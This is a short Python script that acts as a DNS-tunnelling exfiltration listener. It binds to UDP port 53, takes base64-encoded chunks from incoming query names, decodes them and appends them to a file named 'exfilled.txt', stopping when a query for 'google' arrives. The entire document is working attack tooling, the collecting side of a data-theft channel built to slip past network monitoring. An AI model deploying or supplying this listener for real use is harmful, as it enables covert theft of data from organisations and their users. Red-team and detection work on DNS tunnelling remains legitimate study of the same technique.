#!/usr/bin/env python

import socket
import base64

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(('0.0.0.0', 53))

with open('exfilled.txt', 'w') as f:
    domain = ''
    while domain != 'google':

        # check padding - this is hacky and discusting
        if len(domain) % 4 > 1:
            domain = domain + 'AA=='[len(domain)%4:]

        chunk = base64.urlsafe_b64decode(domain)
        f.write(chunk)
        data, addr = sock.recvfrom(200)
        domain = data[13:].rstrip("\x03com\x00\x00\x01\x00\x01")
